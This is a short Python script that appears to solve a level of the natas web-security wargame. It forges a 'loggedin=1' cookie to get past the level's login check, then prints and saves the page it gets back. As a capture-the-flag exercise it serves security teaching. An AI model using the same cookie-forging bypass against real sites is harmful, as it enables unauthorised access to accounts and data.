import requests

import utils

"""
1. you need to change the cookie that's sent to the endpoint to access the level
"""

LEVEL = 5
cookies = {"loggedin": "1"}

username, password, url, auth = utils.get_natas_credentials(LEVEL)

r = requests.get(url, auth=auth, cookies=cookies)

print(r.text)
print(r.cookies)

utils.save_file("output.txt", r.text)